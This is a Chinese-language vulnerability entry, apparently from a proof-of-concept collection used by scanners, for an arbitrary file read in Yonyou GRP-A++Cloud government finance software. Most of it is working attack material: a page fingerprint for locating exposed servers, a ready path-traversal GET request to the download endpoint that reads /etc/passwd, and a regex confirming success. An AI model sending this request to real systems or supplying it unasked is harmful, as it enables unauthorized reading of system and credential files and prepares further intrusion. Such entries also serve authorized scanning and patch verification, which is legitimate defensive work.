﻿# 用友GRP-A++ downloadfileName任意文件读取漏洞

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明：用云GRP A++Cloud是一款高性能的云端企业资源规划（ERP）软件，通过整合各种业务流程和部门数据，为企业提供全面的管理和决策支持。它采用了先进的云计算技术，具有卓越的稳定性、可靠性和安全性，能够帮助企业实现数字化转型和业务优化。
用友GRP A++Cloud 政府财务云 任意文件读取漏洞，攻击者可利用此漏洞收集敏感信息，从而为下一步攻击做准备。

> 漏洞特征：body="/pf/portal/login/css/fonts/style.css"

> 验证脚本：HTTP

```
GET /ma/emp/maEmp/download?fileName=../../../etc/passwd HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：用友GRP-A++ downloadfileName任意文件读取漏洞.poc

